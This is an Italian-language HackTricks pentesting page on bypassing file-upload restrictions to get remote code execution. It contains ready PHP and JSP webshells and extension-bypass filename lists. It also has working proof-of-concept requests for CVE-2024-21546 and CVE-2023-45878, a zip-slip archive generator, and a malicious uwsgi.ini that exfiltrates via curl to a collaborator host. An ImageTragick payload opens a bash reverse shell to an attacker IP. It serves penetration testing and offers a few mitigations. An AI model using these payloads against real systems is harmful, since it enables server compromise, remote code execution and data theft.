# Upload di file

{{#include ../../banners/hacktricks-training.md}}

## Metodologia generale per l'upload di file

Altre estensioni utili:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Bypassare i controlli sulle estensioni dei file

1. Se applicabili, **controlla** le **estensioni precedenti.** Provale anche usando alcune **lettere maiuscole**: _pHp, .pHP5, .PhAr ..._
2. _Controlla **l'aggiunta di un'estensione valida prima** dell'estensione eseguibile (usa anche le estensioni precedenti):_
- _file.png.php_
- _file.png.Php5_
3. Prova ad aggiungere **caratteri speciali alla fine.** Puoi usare Burp per **bruteforce** su tutti i caratteri **ASCII** e **Unicode**. (_Nota che puoi anche provare a usare le **estensioni** menzionate in precedenza_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Prova a bypassare le protezioni **ingannando il parser delle estensioni** lato server con tecniche come il **raddoppio** dell'**estensione** o l'**aggiunta di junk** (byte **null**) tra le estensioni. _Puoi anche usare le **estensioni precedenti** per preparare un payload migliore._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Aggiungi **un altro livello di estensioni** al controllo precedente:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Prova a mettere l'**estensione eseguibile prima dell'estensione valida** e spera che il server sia mal configurato. (utile per sfruttare misconfigurazioni di Apache dove qualsiasi file con estensione .php, anche se non termina con .php, eseguirà codice):
- _ex: file.php.png_
7. Usare **NTFS alternate data stream (ADS)** in **Windows**. In questo caso, verrà inserito un carattere due punti ":" dopo un'estensione proibita e prima di una consentita. Di conseguenza, verrà creato sul server un **file vuoto con l'estensione proibita** (es. "file.asax:.jpg"). Questo file potrebbe essere modificato successivamente usando altre tecniche, come l'uso del suo short filename. Il pattern "**::$data**" può anche essere usato per creare file non vuoti. Pertanto, aggiungere un punto dopo questo pattern può essere utile per bypassare ulteriori restrizioni (es. "file.asp::$data.")
8. Prova a superare i limiti del nome file. L'estensione valida viene troncata. E il PHP malevolo rimane. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. trailing dot) – CVE-2024-21546

Alcuni handler di upload trimmano o normalizzano i caratteri punto finali dal filename salvato. In UniSharp’s Laravel Filemanager (unisharp/laravel-filemanager) nelle versioni precedenti alla 2.9.1, puoi bypassare la validazione delle estensioni facendo:

- Usare un MIME immagine valido e magic header (es., PNG’s `\x89PNG\r\n\x1a\n`).
- Nominare il file caricato con un'estensione PHP seguita da un punto, es., `shell.php.`.
- Il server rimuove il punto finale e conserva `shell.php`, che verrà eseguito se posizionato in una directory servita dal web (public storage di default come `/storage/files/`).

PoC minimo (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
Quindi accedi al percorso salvato (tipico in Laravel + LFM):
```
GET /storage/files/0xdf.php?cmd=id
```
### Bypass Content-Type, Magic Number, Compression & Resizing

- Bypass **Content-Type** checks impostando il **value** dell'**header** **Content-Type** a: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Bypass **magic number** check aggiungendo all'inizio del file i **bytes di una vera immagine** (per confondere il comando _file_). Oppure inserire la shell nei **metadata**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` oppure potresti anche **introdurre il payload direttamente** in un'immagine:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- Se alla tua immagine viene applicata una **compressione**, per esempio usando alcune librerie PHP standard come [PHP-GD](https://www.php.net/manual/fr/book.image.php), le tecniche precedenti non saranno efficaci. Tuttavia, puoi usare il **PLTE chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) per inserire del testo che **sopravvive alla compressione**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- La pagina web potrebbe anche **ridimensionare** l'**image**, usando ad esempio le funzioni PHP-GD `imagecopyresized` o `imagecopyresampled`. Tuttavia, puoi usare l'**IDAT chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) per inserire del testo che **sopravvive alla compressione**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Un'altra tecnica per creare un payload che **sopravvive a un ridimensionamento dell'immagine**, usando la funzione PHP-GD `thumbnailImage`. Tuttavia, puoi usare il **tEXt chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) per inserire del testo che **sopravvive alla compressione**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Altri trucchi da verificare

- Trova una vulnerabilità per **rename** il file già caricato (per cambiare l'estensione).
- Trova una vulnerabilità **Local File Inclusion** per eseguire il backdoor.
- **Possible Information disclosure**:
1. Carica **più volte** (e allo **stesso tempo**) lo **stesso file** con lo **stesso nome**
2. Carica un file con il **nome** di un **file** o **cartella** che **esiste già**
3. Caricare un file con **"." , "..", o "…" come nome**. Per esempio, in Apache su **Windows**, se l'applicazione salva i file caricati nella directory "/www/uploads/", il filename "." creerà un file chiamato
uploads” nella directory "/www/".
4. Caricare un file che potrebbe non essere facilmente eliminabile come **"…:.jpg"** in **NTFS**. (Windows)
5. Caricare un file in **Windows** con **caratteri non validi** come `|<>*?”` nel nome. (Windows)
6. Caricare un file in **Windows** usando nomi **riservati** (**vietati**) come CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, e LPT9.
- Prova anche a **uploadare un eseguibile** (.exe) o una **.html** (meno sospetta) che **eseguirà codice** quando accidentalmente aperta dalla vittima.

### Special extension tricks

Se stai cercando di caricare file su un **PHP server**, [take a look at the **.htaccess** trick to execute code](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
Se stai cercando di caricare file su un **ASP server**, [take a look at the **.config** trick to execute code](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

I file `.phar` sono come i `.jar` per java, ma per php, e possono essere **usati come un file php** (eseguendoli con php, o includendoli all'interno di uno script...)

L'estensione `.inc` è a volte usata per file php che servono solo per **importare file**, quindi, a un certo punto, qualcuno potrebbe aver permesso **a questa estensione di essere eseguita**.

## **Jetty RCE**

Se puoi caricare un file XML in un server Jetty puoi ottenere [RCE because **new *.xml and *.war are automatically processed**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Quindi, come indicato nell'immagine seguente, carica il file XML in `$JETTY_BASE/webapps/` e aspetta la shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

Per un'esplorazione dettagliata di questa vulnerabilità controlla la ricerca originale: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Le vulnerabilità di Remote Command Execution (RCE) possono essere sfruttate in server uWSGI se si ha la capacità di modificare il file di configurazione `.ini`. I file di configurazione uWSGI utilizzano una sintassi specifica per incorporare variabili "magiche", segnaposti e operatori. In particolare, l'operatore '@', utilizzato come `@(filename)`, è progettato per includere il contenuto di un file. Tra i vari schemi supportati in uWSGI, lo schema "exec" è particolarmente potente, permettendo la lettura di dati dallo stdout di un processo. Questa funzionalità può essere manipolata per scopi malevoli come Remote Command Execution o Arbitrary File Write/Read quando viene processato un file di configurazione `.ini`.

Considera il seguente esempio di un file `uwsgi.ini` dannoso, che mostra vari schemi:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
L'esecuzione del payload avviene durante il parsing del file di configurazione. Perché la configurazione venga attivata e analizzata, il processo uWSGI deve essere riavviato (potenzialmente dopo un crash o a causa di un attacco Denial of Service) oppure il file deve essere impostato su auto-reload. La funzionalità auto-reload, se abilitata, ricarica il file a intervalli specificati quando viene rilevata una modifica.

È cruciale comprendere la natura permissiva del parsing dei file di configurazione di uWSGI. In particolare, il payload discusso può essere inserito in un file binario (ad esempio un'immagine o un PDF), allargando ulteriormente la superficie di possibile exploitation.

### Gibbon LMS arbitrary file write to pre-auth RCE (CVE-2023-45878)

Un endpoint non autenticato in Gibbon LMS permette arbitrary file write all'interno della web root, portando a pre-auth RCE scrivendo un file PHP. Versioni vulnerabili: fino e incluso 25.0.01.

- Endpoint: `/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`
- Method: POST
- Required params:
- `img`: data-URI-like string: `[mime];[name],[base64]` (il server ignora type/name e decodifica in base64 la parte finale)
- `path`: destination filename relative to Gibbon install dir (e.g., `poc.php` or `0xdf.php`)
- `gibbonPersonID`: any non-empty value is accepted (e.g., `0000000001`)

PoC minimale per scrivere e leggere un file:
```bash
# Prepare test payload
printf '0xdf was here!' | base64
# => MHhkZiB3YXMgaGVyZSEK

# Write poc.php via unauth POST
curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;test,MHhkZiB3YXMgaGVyZSEK&path=poc.php&gibbonPersonID=0000000001'

# Verify write
curl http://target/Gibbon-LMS/poc.php
```
Carica un webshell minimale ed esegui comandi:
```bash
# '<?php system($_GET["cmd"]); ?>' base64
# PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==

curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;foo,PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==&path=shell.php&gibbonPersonID=0000000001'

curl 'http://target/Gibbon-LMS/shell.php?cmd=whoami'
```
Note:
- Il handler esegue `base64_decode($_POST["img"])` dopo aver separato per `;` e `,`, quindi scrive i byte in `$absolutePath . '/' . $_POST['path']` senza validare estensione/tipo.
- Il codice risultante viene eseguito come web service user (ad esempio XAMPP Apache su Windows).

I riferimenti per questo bug includono l'advisory di usd HeroLab e la voce NVD. Vedi la sezione References qui sotto.

## **wget File Upload/SSRF Trick**

In alcune occasioni potresti trovare che un server sta usando **`wget`** per **download files** e puoi **indicare** l'**URL**. In questi casi, il codice potrebbe controllare che l'estensione dei file scaricati sia nella whitelist per assicurarsi che vengano scaricati solo file consentiti. Tuttavia, **questo controllo può essere bypassato.**\
La **lunghezza massima** di un **filename** in **linux** è **255**, tuttavia, **wget** tronca i nomi dei file a **236** caratteri. Puoi **download a file called "A"*232+".php"+".gif"**, questo filename aggirerà il controllo (come in questo esempio **".gif"** è un'estensione **valida**) ma `wget` rinominerà il file in **"A"*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Nota che **un'altra opzione** a cui potresti pensare per bypassare questo controllo è far sì che il **HTTP server rediriga a un file diverso**, così l'URL iniziale bypasserà il controllo ma poi wget scaricherà il file reindirizzato con il nuovo nome. Questo **non funzionerà** **a meno che** wget non venga usato con il **parametro** `--trust-server-names` perché **wget scaricherà la pagina reindirizzata con il nome del file indicato nell'URL originale**.

### Evasione della directory di upload tramite NTFS junctions (Windows)

(Per questo attacco avrai bisogno di accesso locale alla macchina Windows) Quando gli upload vengono salvati in sotto-cartelle per utente su Windows (e.g., C:\Windows\Tasks\Uploads\<id>\) e controlli la creazione/cancellazione di quella sottocartella, puoi sostituirla con una directory junction che punta a un percorso sensibile (e.g., il webroot). I successivi upload verranno scritti nel percorso di destinazione, permettendo l'esecuzione di codice se il target interpreta codice lato server.

Esempio di flusso per reindirizzare gli upload nella webroot di XAMPP:
```cmd
:: 1) Upload once to learn/confirm your per-user folder name (e.g., md5 of form fields)
::    Observe it on disk: C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882

:: 2) Remove the created folder and create a junction to webroot
rmdir C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882
cmd /c mklink /J C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882 C:\xampp\htdocs

:: 3) Re-upload your payload; it lands under C:\xampp\htdocs
::    Minimal PHP webshell for testing
::    <?php echo shell_exec($_REQUEST['cmd']); ?>

:: 4) Trigger
curl "http://TARGET/shell.php?cmd=whoami"
```
Note
- mklink /J crea una NTFS directory junction (reparse point). L'account del web server deve seguire la junction e avere permessi di scrittura nella destinazione.
- Questo reindirizza scritture arbitrarie di file; se la destinazione esegue script (PHP/ASP), diventa RCE.
- Contromisure: don’t allow writable upload roots to be attacker‑controllable under C:\Windows\Tasks or similar; block junction creation; validate extensions server‑side; store uploads on a separate volume or with deny‑execute ACLs.

### GZIP-compressed body upload + path traversal in destination param → JSP webshell RCE (Tomcat)

Alcuni handler di upload/ingest scrivono il raw request body in un percorso filesystem costruito da query parameter controllati dall'utente. Se l'handler supporta anche Content-Encoding: gzip e non canonicalizza/valida il percorso di destinazione, puoi combinare directory traversal con un payload gzippato per scrivere byte arbitrari in una directory servita dal web e ottenere RCE (es. drop una JSP sotto Tomcat’s webapps).

Flusso di sfruttamento generico:
- Prepara il payload lato server (e.g., minimal JSP webshell) e gzip-comprimi i byte.
- Invia un POST dove un path parameter (e.g., token) contiene traversal che esce dalla cartella prevista, e file indica il filename da persistere. Imposta Content-Type: application/octet-stream e Content-Encoding: gzip; il body è il payload compresso.
- Naviga al file scritto per scatenare l'esecuzione.

Illustrative request:
```http
POST /fileupload?token=..%2f..%2f..%2f..%2fopt%2ftomcat%2fwebapps%2fROOT%2Fjsp%2F&file=shell.jsp HTTP/1.1
Host: target
Content-Type: application/octet-stream
Content-Encoding: gzip
Content-Length: <len>

<gzip-compressed-bytes-of-your-jsp>
```
Quindi trigger:
```http
GET /jsp/shell.jsp?cmd=id HTTP/1.1
Host: target
```
Note
- I percorsi target variano in base all'installazione (es., /opt/TRUfusion/web/tomcat/webapps/trufusionPortal/jsp/ in alcuni stack). Qualsiasi cartella esposta via web che esegue JSP funzionerà.
- L'estensione Hackvertor di Burp Suite può produrre un corretto gzip body dal tuo payload.
- Questo è un puro pattern pre-auth arbitrary file write → RCE; non si basa su multipart parsing.

Mitigations
- Deriva le destinazioni di upload server-side; non fidarti mai dei frammenti di percorso provenienti dai client.
- Canonicalizza e applica che il percorso risolto rimanga all'interno di una directory base allow-listed.
- Conserva gli upload su un volume non eseguibile e nega l'esecuzione di script da percorsi scrivibili.

## Strumenti

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) è uno strumento potente progettato per assistere Pentesters e Bug Hunters nel testare i meccanismi di file upload. Sfrutta varie tecniche da bug bounty per semplificare il processo di identificazione e sfruttamento delle vulnerabilità, assicurando valutazioni approfondite delle web application.

### Corrompere gli indici di upload con le stranezze di snprintf (storico)

Alcuni legacy upload handler che usano `snprintf()` o simili per costruire array multi-file da un singolo upload possono essere ingannati nel falsificare la struttura `_FILES`. A causa di incoerenze e troncamenti nel comportamento di `snprintf()`, un singolo upload sapientemente costruito può apparire come più file indicizzati sul lato server, confondendo la logica che assume una forma rigorosa (es., trattandolo come un multi-file upload e seguendo rami non sicuri). Sebbene oggi sia di nicchia, questo pattern di “index corruption” riemerge occasionalmente in CTF e in codebase più vecchie.

## Da File upload ad altre vulnerabilità

- Imposta **filename** su `../../../tmp/lol.png` e prova a ottenere una **path traversal**
- Imposta **filename** su `sleep(10)-- -.jpg` e potresti riuscire a ottenere una **SQL injection**
- Imposta **filename** su `<svg onload=alert(document.domain)>` per ottenere una XSS
- Imposta **filename** su `; sleep 10;` per testare qualche command injection (altri [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Prova **diversi payload svg** da [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- Se puoi indicare al web server di prendere un'immagine da un URL potresti provare ad abusare di una [SSRF](../ssrf-server-side-request-forgery/index.html). Se questa **image** verrà **salvata** in qualche sito **pubblico**, potresti anche indicare un URL da [https://iplogger.org/invisible/](https://iplogger.org/invisible/) e **rubare informazioni di ogni visitatore**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- PDF appositamente creati per XSS: la [pagina seguente mostra come **iniettare dati PDF per ottenere l'esecuzione di JS**](../xss-cross-site-scripting/pdf-injection.md). Se puoi uploadare PDF potresti preparare un PDF che eseguirà JS arbitrario seguendo le indicazioni fornite.
- Upload the \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) content per verificare se il server ha qualche **antivirus**
- Verifica se esiste qualche **size limit** quando carichi file

Ecco una top 10 delle cose che puoi ottenere caricando file (da [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Byte magici dell'header

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Fai riferimento a [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) per altri tipi di file.

## Upload di ZIP/Tar decompressi automaticamente

Se puoi uploadare uno ZIP che verrà decompresso all'interno del server, puoi fare 2 cose:

### Symlink

Carica un archivio contenente soft link verso altri file; poi, accedendo ai file decompressi accederai ai file collegati:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Decomprimere in cartelle diverse

L'imprevista creazione di file in directory durante la decompressione è un problema significativo. Nonostante le ipotesi iniziali secondo cui questa configurazione potesse proteggere dall'esecuzione di comandi a livello OS tramite upload di file malevoli, il supporto alla compressione gerarchica e le capacità di directory traversal del formato di archivio ZIP possono essere sfruttate. Questo permette agli attaccanti di eludere le restrizioni e uscire dalle secure upload directories manipolando la funzionalità di decompressione dell'applicazione target.

È disponibile un exploit automatizzato per creare tali file su [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). L'utilità può essere usata come segue:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Inoltre, la **symlink trick with evilarc** è un'opzione. Se l'obiettivo è prendere di mira un file come `/flag.txt`, dovrebbe essere creato un symlink a quel file nel tuo sistema. Questo assicura che evilarc non incontri errori durante il suo funzionamento.

Di seguito è riportato un esempio di codice Python usato per creare un file zip malevolo:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO


def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Abusing compression for file spraying**

Per maggiori dettagli **consulta il post originale su**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Creazione di una PHP Shell**: Il codice PHP viene scritto per eseguire comandi passati tramite la variabile `$_REQUEST`.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying e creazione di file compressi**: Vengono creati più file e viene assemblato un archivio zip contenente questi file.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modifica con un Hex Editor o vi**: I nomi dei file all'interno dello zip vengono alterati usando vi o un hex editor, cambiando "xxA" in "../" per attraversare le directory.

```bash
:set modifiable
:%s/xxA/../g
:x!
```

### ZIP NUL-byte filename smuggling (PHP ZipArchive confusion)

Quando un backend valida le voci di un ZIP usando PHP’s ZipArchive ma l'estrazione scrive sul filesystem usando i nomi raw, puoi nascondere un'estensione non consentita inserendo un NUL (0x00) nei campi filename. ZipArchive tratta il nome della voce come una C‑string e tronca al primo NUL; il filesystem scrive il nome completo, scartando tutto dopo il NUL.

Flusso ad alto livello:
- Prepara un file contenitore legittimo (es. un PDF valido) che incorpora un piccolo stub PHP in uno stream in modo che magic/MIME rimanga un PDF.
- Rinominalo come `shell.php..pdf`, zipalo, poi hex‑edita l'header locale del ZIP e il filename della central directory per sostituire il primo `.` dopo `.php` con `0x00`, ottenendo `shell.php\x00.pdf`.
- I validator che si basano su ZipArchive “vedranno” `shell.php .pdf` e lo permetteranno; l'estrattore scrive `shell.php` su disco, portando a RCE se la cartella di upload è eseguibile.

Minimal PoC steps:
```bash
# 1) Build a polyglot PDF containing a tiny webshell (still a valid PDF)
printf '%s' "%PDF-1.3\n1 0 obj<<>>stream\n<?php system($_REQUEST["cmd"]); ?>\nendstream\nendobj\n%%EOF" > embedded.pdf

# 2) Trick name and zip
cp embedded.pdf shell.php..pdf
zip null.zip shell.php..pdf

# 3) Hex-edit both the local header and central directory filename fields
#    Replace the dot right after ".php" with 00 (NUL) => shell.php\x00.pdf
#    Tools: hexcurse, bless, bvi, wxHexEditor, etc.

# 4) Local validation behavior
php -r '$z=new ZipArchive; $z->open("null.zip"); echo $z->getNameIndex(0),"\n";'
# -> shows truncated at NUL (looks like ".pdf" suffix)
```
Note
- Modifica ENTRAMBE le occorrenze del nome file (locale e central directory). Alcuni strumenti aggiungono anche una voce data descriptor extra – correggi tutti i campi name se presenti.
- Il file payload deve comunque superare magic/MIME sniffing lato server. Incorporare il PHP in uno stream PDF mantiene valida l'intestazione.
- Funziona quando il percorso di enum/validation e il percorso di extraction/write non concordano sul trattamento delle stringhe.

### Stacked/concatenated ZIPs (parser disagreement)

Concatenare due file ZIP validi produce un blob in cui parser diversi si concentrano su record EOCD differenti. Molti strumenti individuano l'ultima End Of Central Directory (EOCD), mentre alcune librerie (es., ZipArchive in workflow specifici) possono analizzare il primo archivio che trovano. Se la validation enumera il primo archivio e l'estrazione usa un altro strumento che rispetta l'ultima EOCD, un archivio benigno può superare i controlli mentre viene estratto uno maligno.

PoC:
```bash
# Build two separate archives
printf test > t1; printf test2 > t2
zip zip1.zip t1; zip zip2.zip t2

# Stack them
cat zip1.zip zip2.zip > combo.zip

# Different views
unzip -l combo.zip   # warns about extra bytes; often lists entries from the last archive
php -r '$z=new ZipArchive; $z->open("combo.zip"); for($i=0;$i<$z->numFiles;$i++) echo $z->getNameIndex($i),"\n";'
```
Schema di abuso
- Crea un archivio benigno (tipo consentito, es. PDF) e un secondo archivio contenente un'estensione bloccata (es. `shell.php`).
- Concatena i due: `cat benign.zip evil.zip > combined.zip`.
- Se il server valida con un parser (vede benign.zip) ma estrae con un altro (processa evil.zip), il file bloccato finisce nel percorso di estrazione.

## ImageTragic

Carica questo contenuto con un'estensione immagine per sfruttare la vulnerabilità **(ImageMagick , 7.0.1-1)** (dall'[exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Incorporare PHP Shell in PNG

